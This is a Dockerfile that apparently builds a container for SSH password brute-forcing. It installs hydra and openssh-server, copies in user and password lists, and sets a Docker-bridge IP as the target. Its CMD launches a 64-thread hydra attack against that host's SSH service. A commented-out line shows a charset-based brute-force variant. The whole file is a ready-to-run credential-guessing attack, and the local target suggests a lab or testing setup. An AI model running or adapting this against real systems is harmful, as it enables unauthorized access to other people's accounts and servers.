FROM ubuntu:14.04

MAINTAINER marcos cano marcos.cano@galileo.edu

RUN apt-get update
RUN apt-get -y install hydra openssh-server


ADD docker/user_list /
ADD docker/passwords /
#ENV server 192.168.8.20
ENV server 172.17.42.1

#CMD hydra -L /passwords -V -x 4:4:aA1 $server ssh
CMD hydra -L /passwords -v -P /passwords -t 64 $server ssh
